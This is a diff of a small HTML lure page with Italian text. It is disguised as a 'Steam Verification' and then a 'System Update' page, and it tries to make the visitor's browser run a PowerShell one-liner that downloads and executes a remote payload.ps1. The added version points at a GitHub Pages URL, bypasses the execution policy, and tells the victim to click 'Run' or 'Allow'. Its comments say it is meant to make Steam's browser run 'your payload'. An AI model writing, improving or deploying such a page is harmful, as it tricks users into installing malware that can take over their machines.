@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Steam Verification</title>
-</head>
+<head><title>System Update</title></head>
 <body>
-    <h1>Sincronizzazione in corso... Non chiudere il browser.</h1>
+    <h1>Inizializzazione ambiente Gaming...</h1>
+    <p>Se vedi un avviso, clicca su "Esegui" o "Permetti".</p>
     <script>
-        // Questo script tenta di forzare l'esecuzione di un comando via PowerShell
-        // puntando al file che hai caricato nello stesso repository
-        window.location.href = "powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('./payload.ps1')";
+        // Questo comando dice al browser di Steam di scaricare ed eseguire il tuo payload
+        const payloadUrl = "https://tuo-username.github.io/nome-repo/payload.ps1";
+        window.location.href = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command IEX (New-Object Net.WebClient).DownloadString('" + payloadUrl + "')";
     </script>
 </body>
 </html>
